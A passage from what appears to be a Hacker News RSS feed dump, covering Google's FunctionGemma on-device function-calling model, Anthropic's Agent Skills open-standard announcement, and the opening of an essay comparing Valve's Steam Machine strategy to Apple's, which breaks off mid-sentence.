         }"><p data-block-key="8nk5z">It has been a transformative year for the Gemma family of models. In 2025, we have grown from 100 million to over 300 million downloads while demonstrating the <a href="https://blog.google/technology/developers/developers-changing-lives-with-gemma-3n/">transformative potential of open models</a>, from defining state-of-the-art single-accelerator performance with <a href="https://blog.google/technology/developers/gemma-3/">Gemma 3</a> to advancing cancer research through <a href="https://blog.google/technology/ai/google-gemma-ai-cancer-therapy-discovery/">the C2S Scale initiative</a>.</p><p data-block-key="7i58b">Since launching the <a href="https://developers.googleblog.com/en/introducing-gemma-3-270m/">Gemma 3 270M model,</a> the number one request we’ve received from developers is for native function calling capabilities. We listened, recognizing that as the industry shifts from purely conversational interfaces to active agents, models need to do more than just talk — they need to act. This is particularly compelling on-device, where agents can automate complex, multi-step workflows, from setting reminders to toggling system settings. To enable this at the edge, models must be lightweight enough to run locally and specialized enough to be reliable.</p><p data-block-key="fmj55">Today, we are releasing FunctionGemma, a specialized version of our <a href="https://developers.googleblog.com/en/introducing-gemma-3-270m/">Gemma 3 270M</a> model tuned for function calling. It is designed as a strong base for further training into custom, fast, private, local agents that translate natural language into executable API actions.</p><p data-block-key="9qs74">FunctionGemma acts as a fully independent agent for private, offline tasks, or as an intelligent traffic controller for larger connected systems. In this role, it can handle common commands instantly at the edge, while routing more complex tasks to models like Gemma 3 27B.</p></div>
  

  
    
  
    




  <uni-youtube-player-article index="2" thumbnail-alt="Introducing FunctionGemma" video-id="-Tgc_9uYJLI" video-type="video">
  </uni-youtube-player-article>











  


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;FunctionGemma: Bringing bespoke function calling to the edge&quot;
         }"><h3 data-block-key="iv8ay">What makes FunctionGemma unique</h3><ul><li data-block-key="49q82"><b>Unified action and chat:</b> FunctionGemma knows how to talk to both computers and humans. It can generate structured function calls to execute tools, then switch context to summarize the results in natural language for the user.</li><li data-block-key="ebirk"><b>Built for customization:</b> FunctionGemma is designed to be molded, not just prompted. In our "Mobile Actions" evaluation, fine-tuning transformed the model’s reliability, boosting accuracy from a 58% baseline to 85%. This confirms that for edge agents, a dedicated, trained specialist is an efficient path to production-grade performance.</li><li data-block-key="7rblf"><b>Engineered for the edge:</b> Small enough to run on edge devices like the <a href="https://www.jetson-ai-lab.com/models/functiongemma">NVIDIA Jetson Nano</a> and mobile phones, the model uses Gemma’s 256k vocabulary to efficiently tokenize JSON and multilingual inputs. This makes it a strong base for fine-tuning in specific domains, reducing sequence length to ensure minimum latency and total user privacy.</li><li data-block-key="b5v5"><b>Broad ecosystem support:</b> The model is supported by popular tools across the entire workflow: fine-tune with <a href="https://huggingface.co/collections/google/functiongemma">Hugging Face Transformers</a>, <a href="https://docs.unsloth.ai/models/function-gemma">Unsloth</a>, Keras or <a href="https://github.com/NVIDIA-NeMo/Automodel/blob/main/examples/llm_finetune/gemma/functiongemma_xlam.yaml">NVIDIA NeMo</a> and deploy using <a href="https://github.com/google-ai-edge/LiteRT-LM/blob/main/README.md">LiteRT-LM</a>, vLLM, <a href="https://huggingface.co/collections/mlx-community/functiongemma">MLX</a>, <a href="https://huggingface.co/ggml-org/functiongemma-270m-it-GGUF">Llama.cpp</a>, <a href="https://ollama.com/library/functiongemma">Ollama</a>, <a href="https://console.cloud.google.com/vertex-ai/publishers/google/model-garden/functiongemma">Vertex AI</a> or <a href="https://lmstudio.ai/models/functiongemma">LM Studio</a>.</li></ul></div>
  

  
    














<uni-image-full-width alignment="full" alt-text="Bar Graph of FunctionGemma Accuracy on Mobile Actions before and after fine-tuning" external-image="" or-mp4-video-title="" or-mp4-video-url="" section-header="FunctionGemma: Bringing bespoke function calling to the edge" custom-class="image-full-width--constrained-width uni-component-spacing">
  
    <div slot="caption-slot">
      <p data-block-key="al249">FunctionGemma accuracy on Mobile Actions dataset before and after <a href="https://github.com/google-gemini/gemma-cookbook/blob/main/FunctionGemma/%5BFunctionGemma%5DFinetune_FunctionGemma_270M_for_Mobile_Actions_with_Hugging_Face.ipynb">fine-tuning</a> on a held out eval set.</p>
    </div>
  
  
    <p><img alt="Bar Graph of FunctionGemma Accuracy on Mobile Actions before and after fine-tuning" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma_Chart_RD1_V01_1.width-100.format-webp.webp" loading="lazy" data-loading="{
            &quot;mobile&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma_Chart_RD1_V01_1.width-500.format-webp.webp&quot;,
            &quot;desktop&quot;: &quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/FunctionGemma_Chart_RD1_V01_1.width-1000.format-webp.webp&quot;
          }">
    </p>
  
</uni-image-full-width>


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;FunctionGemma: Bringing bespoke function calling to the edge&quot;
         }"><h2 data-block-key="8nk5z">When to choose FunctionGemma</h2><p data-block-key="1n8kk">FunctionGemma is the bridge between natural language and software execution. It is the right tool if:</p><ul><li data-block-key="53sff"><b>You have a defined API surface:</b> Your application has a defined set of actions (e.g., smart home, media, navigation).</li><li data-block-key="9jgn5"><b>You are ready to fine-tune:</b> You need the consistent, deterministic behavior that comes from fine-tuning on specific data, rather than the variability of zero-shot prompting.</li><li data-block-key="8i36a"><b>You prioritize local-first deployment:</b> Your application requires near-instant latency and total data privacy, running efficiently within the compute and battery limits of edge devices.</li><li data-block-key="8u7fp"><b>You are building compound systems:</b> You need a lightweight edge model to handle local actions, allowing your system to process common commands on-device and only query larger models (like Gemma 3 27B) for more complex tasks.</li></ul><h2 data-block-key="44eug">How to see it in action</h2><p data-block-key="f8k26">Let's look at how these models transform actual user experiences. You can explore these capabilities in the <a href="https://play.google.com/store/apps/details?id=com.google.ai.edge.gallery&amp;pcampaignid=web_share">Google AI Edge Gallery app</a> through two distinct experiences: an interactive game and a developer challenge.</p><h3 data-block-key="cqdag">Mobile Actions fine tuning</h3><p data-block-key="adj9l">This demo reimagines assistant interaction as a fully offline capability. Whether it’s "<i>Create a calendar event for lunch tomorrow,</i>" "<i>Add John to my contacts</i>" or "<i>Turn on the flashlight,</i>" the model parses the natural language and identifies the correct OS tool to execute the command. To unlock this agent, developers are invited to use our <a href="https://github.com/google-gemini/gemma-cookbook/blob/main/FunctionGemma/%5BFunctionGemma%5DFinetune_FunctionGemma_270M_for_Mobile_Actions_with_Hugging_Face.ipynb">fine-tuning cookbook</a> to build the model and load it onto their mobile device.</p></div>
  

  
    














<uni-image-full-width alignment="full" alt-text="Mobile Action demo that reimagines assistant interaction as a fully offline capability." external-image="" or-mp4-video-title="Mobile Action" or-mp4-video-url="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/01_MobileActions.mp4" section-header="FunctionGemma: Bringing bespoke function calling to the edge" custom-class="image-full-width--constrained-width uni-component-spacing">
  
  
</uni-image-full-width>


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;FunctionGemma: Bringing bespoke function calling to the edge&quot;
         }"><h3 data-block-key="8nk5z">TinyGarden game demo</h3><p data-block-key="cg11h">In this interactive mini-game, players use voice commands to manage a virtual plot of land. You might say, "Plant sunflowers in the top row and water them," and the model decomposes this into specific app functions like plantCrop or waterCrop targeting specific grid coordinates. This proves that a 270M model can handle multi-turn logic to drive custom game mechanics, on a mobile phone, without ever pinging a server.</p></div>
  

  
    














<uni-image-full-width alignment="full" alt-text="Tini Garden mini-game that shows players using voice commands to manage a virtual plot of land." external-image="" or-mp4-video-title="Tiny Garden" or-mp4-video-url="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/02_TinyGarden.mp4" section-header="FunctionGemma: Bringing bespoke function calling to the edge" custom-class="image-full-width--constrained-width uni-component-spacing">
  
  
</uni-image-full-width>


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;FunctionGemma: Bringing bespoke function calling to the edge&quot;
         }"><h3 data-block-key="oa3cj">FunctionGemma Physics Playground</h3><p data-block-key="1a2c8">Use natural language to solve fun physics simulation puzzles in <a href="https://huggingface.co/spaces/webml-community/FunctionGemma-Physics-Playground">a game that runs 100% locally in your browser</a>, powered by FunctionGemma and Transformers.js!</p><p data-block-key="4r89e">Credit: @xenovacom on X</p></div>
  

  
    














<uni-image-full-width alignment="full" alt-text="FunctionGemma Physics Playground" external-image="" or-mp4-video-title="FunctionGemma Physics Playground" or-mp4-video-url="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/FG3_-_SD_480p.mov" section-header="FunctionGemma: Bringing bespoke function calling to the edge" custom-class="image-full-width--constrained-width uni-component-spacing">
  
  
</uni-image-full-width>


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;FunctionGemma: Bringing bespoke function calling to the edge&quot;
         }"><h2 data-block-key="oa3cj">How to try FunctionGemma today</h2><p data-block-key="fasnq">We are moving from an era of chatbots to an era of action. With FunctionGemma, that power now fits in your pocket.</p><ul><li data-block-key="a26e8"><b>Download:</b> Get the model on <a href="https://huggingface.co/google/functiongemma-270m-it">Hugging Face</a> or <a href="https://www.kaggle.com/models/google/functiongemma">Kaggle</a>.</li><li data-block-key="7pnnc"><b>Learn:</b> Check out the <a href="https://ai.google.dev/gemma/docs/functiongemma">guides</a> on <a href="https://ai.google.dev/gemma/docs/functiongemma/formatting-and-best-practices">function calling templates</a>, <a href="https://ai.google.dev/gemma/docs/functiongemma/full-function-calling-sequence-with-functiongemma">how to sequence the model with function responses</a> and <a href="https://ai.google.dev/gemma/docs/functiongemma/finetuning-with-functiongemma">fine-tuning</a>.</li><li data-block-key="e52a8"><b>Explore:</b> Download the updated <a href="https://play.google.com/store/apps/details?id=com.google.ai.edge.gallery&amp;pcampaignid=web_share">Google AI Edge Gallery</a> to try the demos.</li><li data-block-key="7u17r"><b>Build:</b> Access the Mobile Actions <a href="https://ai.google.dev/gemma/docs/functiongemma/mobile-actions">guide</a> with a <a href="https://github.com/google-gemini/gemma-cookbook/blob/main/FunctionGemma/%5BFunctionGemma%5DFinetune_FunctionGemma_270M_for_Mobile_Actions_with_Hugging_Face.ipynb">Colab notebook</a> and <a href="https://huggingface.co/datasets/google/mobile-actions">dataset</a> to train your own specialized agent.</li><li data-block-key="42kb9"><b>Deploy:</b> Easily publish your own models onto mobile devices using <a href="https://github.com/google-ai-edge/LiteRT-LM">LiteRT-LM</a> or use alongside larger models on Vertex AI or NVIDIA devices like RTX PRO and DGX Spark.</li></ul><p data-block-key="2bqvk">We can’t wait to see the unique, private, and ultra-fast experiences you unlock on-device.</p></div>
  


            
            

            
              




            
          </div>
  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Firefox will have an option to disable all AI features (430 pts)]]></title>
            <link>https://mastodon.social/@firefoxwebdevs/115740500373677782</link>
            <guid>46316409</guid>
            <pubDate>Thu, 18 Dec 2025 18:18:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mastodon.social/@firefoxwebdevs/115740500373677782">https://mastodon.social/@firefoxwebdevs/115740500373677782</a>, See on <a href="https://news.ycombinator.com/item?id=46316409">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[GPT-5.2-Codex (488 pts)]]></title>
            <link>https://openai.com/index/introducing-gpt-5-2-codex/</link>
            <guid>46316367</guid>
            <pubDate>Thu, 18 Dec 2025 18:14:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openai.com/index/introducing-gpt-5-2-codex/">https://openai.com/index/introducing-gpt-5-2-codex/</a>, See on <a href="https://news.ycombinator.com/item?id=46316367">Hacker News</a></p>
Couldn't get https://openai.com/index/introducing-gpt-5-2-codex/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Agent Skills is now an open standard (266 pts)]]></title>
            <link>https://claude.com/blog/organization-skills-and-directory</link>
            <guid>46315414</guid>
            <pubDate>Thu, 18 Dec 2025 17:04:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://claude.com/blog/organization-skills-and-directory">https://claude.com/blog/organization-skills-and-directory</a>, See on <a href="https://news.ycombinator.com/item?id=46315414">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main"><div data-prevent-flicker="true" data-animate-hero-wrap=""><div data-animate-hero-heading="" id="w-node-_512c3258-1b20-382a-88d4-7eab7cbdc3f9-b08de180"><p><img src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/6903d22651dd05046d0fdb0b_39c40393e610cc0a5e65f50ad12ff5ada273f792-1000x1000.svg" loading="lazy" alt=""></p></div><div id="w-node-_512c3258-1b20-382a-88d4-7eab7cbdc3ec-b08de180"><ul role="list"><li></li><li></li><li></li><li></li><li><div><p>Share</p><p><a fs-copyclip-message="Copied!" fs-copyclip-element="click" data-wf-native-id-path="c328f618-c410-4c26-ebfd-504346b59662" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="c328f618-c410-4c26-ebfd-504346b59662" href="#">Copy link</a></p><p>https://claude.com/blog/organization-skills-and-directory</p></div></li></ul></div></div><div id="customer-stories"><div><p>In October, we introduced <a href="https://claude.com/blog/skills" data-wf-native-id-path="2b5afa72-5605-c7c6-46a3-8584530b0c09" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="2b5afa72-5605-c7c6-46a3-8584530b0c09">skills</a>—a way to teach Claude repeatable workflows tailored to how you work. Today we're making skills easier to deploy, discover, and build: organization-wide management for admins; a directory of partner-built skills from Notion, Canva, Figma, Atlassian, and others; and an open standard so skills work across AI platforms.</p><h2><strong>Manage skills across your organization</strong></h2><p>Claude Team and Enterprise plan admins can now provision skills centrally from admin settings. Admin-provisioned skills are enabled by default for all users. Users can still toggle individual skills off if they choose. This gives organizations consistent, approved workflows across teams while letting individual users customize their experience.</p><figure><p><img src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/6943adae2f71bafa12c42790_Skills-M1-1_Admin-Settings_Blog-1920x1080.png" loading="lazy" alt=""></p></figure><h2><strong>Discover, create, and edit new skills</strong></h2><p>Creating skills is now simpler. Describe what you want and Claude helps build it, or write instructions directly. For complex workflows, upload skill folders or use the skill-creator. Claude can also help you edit existing skills, and new previews show full contents so you can understand exactly what a skill does before enabling it.</p><h2><strong>Skills directory</strong></h2><p>A growing collection of partner-built skills is now available at <a href="https://claude.com/connectors" data-wf-native-id-path="843dd4fe-222d-8a1e-681e-13c69365261a" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="843dd4fe-222d-8a1e-681e-13c69365261a">claude.com/connectors</a>. </p><figure><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/NGAFwBfuiJ8" title="Skills Directory | Partner Skills for Claude"></iframe></p></figure><p>Admins can provision these partner skills across their organization, giving teams immediate access to workflows for tools they already use without any custom development.</p></div><div data-slider-grid="" role="list" data-animate-card-wrap="" data-slider="" data-slider-desktop-threshold="3" data-slider-tablet-threshold="2" data-slider-loop="true" data-slider-center="false"><div data-slider-card="" data-animate-card-card="" role="listitem"><div><p><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5a84a22074cc407a84848_Atlassian_light.svg" alt="Logo"><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5a84a22074cc407a84848_Atlassian_light.svg" alt="Logo"></p><p>Atlassian’s skills bring our decades of teamwork expertise and best practices to Claude. Now Claude doesn’t just see Jira tickets or Confluence pages, it knows what to do: turning specs into backlogs, generating status reports, surfacing company knowledge, triaging issues, and more.</p></div><div><p>Josh Devenny, Head of Product, Rovo Skills</p></div></div><div data-slider-card="" data-animate-card-card="" role="listitem"><div><p><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5a94f6f82b1f84f489887_Canva_light.svg" alt="Logo"><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5a94baddb6685c1e5410d_Canva_dark.svg" alt="Logo"></p><p>With Skills, Claude now understands how to work within Canva - not just connect to it. Anyone can create full multi-platform campaigns, generate on-brand presentations, and translate content, all with a single, simple prompt.</p></div><div><p>Anwar Haneef, GM &amp; Head of Ecosystem</p></div></div><div data-slider-card="" data-animate-card-card="" role="listitem"><div><p><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5a9dfafef9ff0f1bf02ff_Cloudflare_light.svg" alt="Logo"><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5a9e4fe0c7d9e58ab0519_Cloudflare_dark.svg" alt="Logo"></p><p>Skills have made it possible to one-shot deploying AI Agents and MCP servers onto Cloudflare. We're really excited for people to deploy the apps onto Region:Earth from a quick chat.</p></div><div><p>Kate Reznykova, Engineering Manager, Cloudflare Agents</p></div></div><div data-slider-card="" data-animate-card-card="" role="listitem"><div><p><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5aac4c452118ce3006cb8_Figma_light.svg" alt="Logo"><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5aabef4062d2b887afbad_Figma_dark.svg" alt="Logo"></p><p>Figma skills help teams build higher quality, differentiated products with Claude Code. Now, Claude can better understand the context, details, and intent of designs in Figma and translate those designs into code with accuracy and consistency.</p></div><div><p>Emil Sjölander, Director of Dev Tools</p></div></div><div data-slider-card="" data-animate-card-card="" role="listitem"><div><p><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5ae5cc28a7f003e87512b_Vercel_light.svg" alt="Logo"><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5ae58a9b3ff9512c20db4_Vercel_dark.svg" alt="Logo"></p><p>Skills are a powerful way to extend Claude from figuring out a task to actually doing it. Vercel wants to enable everyone to ship sites, apps, and agents. We built the Vercel Deploy Skill alongside the Claude team to allow more people to go from idea to production. </p></div><div><p>Andrew Qu, Chief of Software</p></div></div><div data-slider-card="" data-animate-card-card="" role="listitem"><div><p><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5aedd1d4ccaa7aaecee72_zapier_light.svg" alt="Logo"><img loading="lazy" src="https://cdn.prod.website-files.com/68a44d4040f98a4adf2207b6/68b5aed89af0a9a659d820f0_zapier_dark.svg" alt="Logo"></p><p>By combining skills with Zapier MCP, organizations get AI that not only knows how work should be done, but actually does it reliably. Skills encode repeatable procedures and best practices; Zapier MCP Tools run them at scale across thousands of apps. The result is faster turnaround, reduced busywork, and repeatable AI-powered processes. </p></div><div><p>Lisa Chapello, Head of AI Platform</p></div></div></div><div><h2><strong>An open standard</strong></h2><p>We're also publishing&nbsp;<a href="https://agentskills.io/" data-wf-native-id-path="27134060-ba4a-1c6c-fd36-3655f353ef7e" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="27134060-ba4a-1c6c-fd36-3655f353ef7e">Agent Skills</a> as an open standard. Like MCP, we believe skills should be portable across tools and platforms—the same skill should work whether you're using Claude or other AI platforms. We've been collaborating with members of the ecosystem, and we're excited to see early adoption of the standard.</p><h2><strong>Getting started</strong></h2><ul role="list"><li><strong>Claude Apps:</strong> Browse the<a href="https://claude.com/connectors" data-wf-native-id-path="27134060-ba4a-1c6c-fd36-3655f353efa3" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="27134060-ba4a-1c6c-fd36-3655f353efa3"> skills directory</a> and enable in Settings &gt; Capabilities &gt; Skills.</li><li><strong>Claude Code:</strong> Install from the plugin directory or check skills into your repository.</li><li><strong>Claude Developer Platform (API):</strong> Use skills via the /v1/skills endpoint. See<a href="https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview" data-wf-native-id-path="27134060-ba4a-1c6c-fd36-3655f353efae" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="27134060-ba4a-1c6c-fd36-3655f353efae"> documentation</a>.</li></ul><p>Admins can provision skills org-wide through Admin Settings. Skills require<a href="https://claude.ai/settings/capabilities" data-wf-native-id-path="d962c1d6-44d1-c514-ad9d-e8f28acfa9dd" data-wf-ao-click-engagement-tracking="true" data-wf-element-id="d962c1d6-44d1-c514-ad9d-e8f28acfa9dd"> Code Execution and File Creation</a> to be enabled.</p></div></div><div data-wf--grid--column-count="12" id="" data-wf--section--theme="dark-3"><div data-wf--content-wrapper--alignment="inherit"><p data-wf--typography-heading--font-style="h2"><h2>Transform how your organization operates with Claude</h2></p></div><div data-wf--content-wrapper--alignment="inherit" data-animate-card-card="" id=""><p>Get the developer newsletter</p><p>Product updates, how-tos, community spotlights, and more. Delivered monthly to your inbox.</p><div><form id="wf-form-Claude-developer-newsletter-subscription" name="wf-form-Claude-developer-newsletter-subscription" data-name="Claude developer newsletter subscription" action="/links.iterable.com/lists/publicAddSubscriberForm?publicIdString=f12dbb96-5d68-4b76-8013-9f175aa07346" method="post" data-form="iterable" data-wf-page-id="68de89a2fbe1f683b08de180" data-wf-element-id="378677a7-5ff3-6a77-07d6-e546d2c8eca4"><p>Please provide your email address if you'd like to receive our monthly developer newsletter. You can unsubscribe at any time.</p></form><div><p>Thank you! You’re subscribed.</p></div><div><p>Sorry, there was a problem with your submission, please try again later.</p></div></div></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Valve is running Apple's playbook in reverse (114 pts)]]></title>
            <link>https://www.garbagecollected.dev/p/valve-the-reverse-apple</link>
            <guid>46314109</guid>
            <pubDate>Thu, 18 Dec 2025 15:45:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.garbagecollected.dev/p/valve-the-reverse-apple">https://www.garbagecollected.dev/p/valve-the-reverse-apple</a>, See on <a href="https://news.ycombinator.com/item?id=46314109">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!CBOj!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!CBOj!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 424w, https://substackcdn.com/image/fetch/$s_!CBOj!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 848w, https://substackcdn.com/image/fetch/$s_!CBOj!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 1272w, https://substackcdn.com/image/fetch/$s_!CBOj!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!CBOj!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png" width="1024" height="559" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/c2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:559,&quot;width&quot;:1024,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1035469,&quot;alt&quot;:&quot;(Apple and Steam logos side by side)&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:&quot;https://www.garbagecollected.dev/i/181957808?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="(Apple and Steam logos side by side)" title="(Apple and Steam logos side by side)" srcset="https://substackcdn.com/image/fetch/$s_!CBOj!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 424w, https://substackcdn.com/image/fetch/$s_!CBOj!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 848w, https://substackcdn.com/image/fetch/$s_!CBOj!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 1272w, https://substackcdn.com/image/fetch/$s_!CBOj!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc2227985-4bb5-45d1-a1a2-a6003c99b51b_1024x559.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>(Image generated with Gemini Nano Banana Pro)</figcaption></figure></div><p><span>In November 2025, Valve “unveiled” the Steam Machine – a living room PC designed to bring your Steam library to the TV. Gaming press covered it as news, but what was missing from the headlines was that this is actually Steam Machine </span><em><strong>2.0</strong></em><span>. Valve already tried this a decade ago, and it flopped.</span></p><p>So why try again?</p><p><span>Because Valve learned from that failure. They learned what Apple had figured out years earlier – hardware, software, and services need to, to quote Jobs, “</span><a href="https://youtu.be/F7pWHsqnxrE?t=220" rel="">just work</a><span>” (2011 WWDC).</span></p><p>This isn’t speculation. Take it from Valve co-founder Gabe Newell’s own thoughts on threats to PC gaming:</p><blockquote><p>The threat right now is that Apple has gained a huge amount of market share, and has a relatively obvious pathway towards entering the living room with their platform [...] I think Apple rolls the console guys really easily. The question is can we make enough progress in the PC space to establish ourselves there, and also figure out better ways of addressing mobile before Apple takes over the living room?</p></blockquote><p><span>(Talk at University of Texas’s LBJ School of Public Affairs, via </span><a href="https://www.polygon.com/2013/1/30/3934112/gabe-newell-steam-boxs-biggest-threat-isnt-consoles-its-apple/" rel="">Polygon in 2013</a><span>)</span></p><p>Newell wasn’t worried about Nintendo, PlayStation, or Xbox; he was worried about Apple, who weren’t even in gaming then (and still aren’t today).</p><p>His solution? Run Apple’s playbook, but do it in reverse.</p><p>To understand what Valve is doing, it helps to see the paths both companies took, and how they mirror each other.</p><p>Apple’s path to becoming the modern corporate juggernaut that nobody saw coming even 20 years ago needs little introduction: Macs, to portable Macbooks, to portable music (iPods), to iPhones, to App Store, to Everything Else, each step further locking customers into the ecosystem through hardware that “just works”.</p><p><span>Valve was founded by ex-Microsoft employees Gabe Newell and Mike Harrington in the late 90s following their frustration that, among other things, </span><a href="https://www.pcgamer.com/gaming-industry/gabe-newell-says-he-founded-valve-after-doom-showed-him-microsoft-was-missing-the-opportunity-offered-by-the-internet-i-was-willing-to-sort-of-put-my-money-where-my-mouth-was/" rel="">Microsoft was getting outflanked in gaming by startups with a better understanding of how to use the internet</a><span>. As you might expect from a company with that origin, they started by making video games like Half-Life, Team Fortress, and Counter-Strike.</span></p><p>Steam came in 2003, created for easy management of updates for their games over the Internet (what today would be called a “proprietary launcher”). What Valve soon realized, though, is that they could turn this “cost” into a source of revenue by making their solutions available to other developers, and so came the Steam Store and services (2005). Over time, they built on this, adding features like Managed Matchmaking and Cloud Saves before they took their first crack at hardware in 2015 with Steam Machine 1.0 (aka the Steam Box).</p><p>The Steam Box… didn’t do so hot. We’ll get to that.</p><p>After that, the important points in the timeline to note for this narrative are the release of the Steam Deck (a portable PC gaming device, perhaps most analogous in function to the Nintendo Switch) in 2022, and the instigator for today, the announcement of the Steam Machine (2.0) for 2026.</p><p>For a snapshot of how Steam stands today:</p><ul><li><p><span>Regularly peaks at ~41MM concurrent users on weekends: </span><a href="https://store.steampowered.com/stats/stats/" rel="">https://store.steampowered.com/stats/stats/</a></p><ul><li><p>Note: that’s concurrent users, not distinct users over the course of the weekend. As a global platform, it’s absolutely the case that distinct user count in a 24 hour time period is higher than that.</p></li></ul></li><li><p><span>While we don’t have any official recent Monthly Active User (MAU) numbers, </span><a href="https://store.steampowered.com/news/group/4145017/view/3133946090937137590" rel="">Valve gave a figure of about 132 MM at the end of 2021</a><span>.</span></p><ul><li><p>If we scale that using the ratio of peak concurrent users then vs now, that gives an estimate of ~200MM MAU (though this is very rough)</p></li><li><p>A couple of contextual comparisons:</p><ul><li><p><span>Netflix has </span><a href="https://ir.netflix.net/ir-overview/profile/default.aspx" rel="">~300 million 